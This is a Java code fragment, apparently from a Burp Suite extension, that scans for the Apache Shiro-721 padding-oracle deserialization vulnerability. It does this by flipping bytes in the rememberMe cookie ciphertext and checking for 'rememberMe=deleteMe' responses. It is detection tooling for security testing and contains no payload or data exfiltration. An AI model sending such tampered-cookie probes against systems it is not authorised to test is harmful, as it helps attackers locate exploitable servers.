        // 基线检测：发送原始请求，如果原始cookie已过期则跳过
        HttpRequestResponse baselineResp;
        try {
            HttpRequest baselineRequest = request
                .withAddedHeader("JaySen-Shiro721-Scan", "true");
            baselineResp = this.montoyaApi.http().sendRequest(baselineRequest);
        } catch (Exception e) {
            this.montoyaApi.logging().logToOutput("[ERROR] Shiro721基线请求发送失败：" + e.getMessage());
            this.montoyaApi.logging().logToError("[ERROR] Shiro721基线请求发送失败：" + e.getMessage());
            return;
        }
        String baselineSetCookie = baselineResp.response().headerValue("Set-Cookie");
        if (baselineSetCookie != null && baselineSetCookie.contains("rememberMe=deleteMe")) {
            montoyaApi.logging().logToOutput("[INFO] Shiro721: 原始session已过期，跳过检测");
            return;
        }

        // 篡改末尾3个字节，至少2个命中才报
        int hitCount = 0;
        for (int pos = ciphertext.length - 1; pos >= ciphertext.length - 3; pos--) {
            try {
                byte[] tampered = ciphertext.clone();
                tampered[pos] ^= 0xFF;

                String tamperedCookie = Base64.getEncoder().encodeToString(tampered);
                HttpRequest modifiedRequest = request
                    .withRemovedHeader("Cookie")
                    .withHeader("Cookie", "rememberMe=" + tamperedCookie)
                    .withAddedHeader("JaySen-Shiro721-Scan", "true");

                HttpRequestResponse attackReqResp = this.montoyaApi.http().sendRequest(modifiedRequest);

                if (logEnable) {
                    saveLogFile.addToBatch(attackReqResp);
                }

                String setCookie = attackReqResp.response().headerValue("Set-Cookie");
                if (setCookie != null && setCookie.contains("rememberMe=deleteMe")) {
                    hitCount++;
                }
            } catch (Exception e) {
                this.montoyaApi.logging().logToOutput("[ERROR] Shiro721检测出错（位置：" + pos + "）：" + e.getMessage());
                this.montoyaApi.logging().logToError("[ERROR] Shiro721检测出错（位置：" + pos + "）：" + e.getMessage());
            }
        }

        if (hitCount >= 2) {
            // 篡改密文后Shiro仍然反序列化 → Padding Oracle 确认存在
            executor.submit(() -> mySuiteTab.addRequestInfo(baselineResp, "shiro721反序列化"));
            montoyaApi.logging().logToOutput("[INFO] 发现Shiro-721反序列化漏洞（Padding Oracle确认）: " + request.url());
        }

        montoyaApi.logging().logToOutput("[INFO] shiro721检测完毕");
    }
}
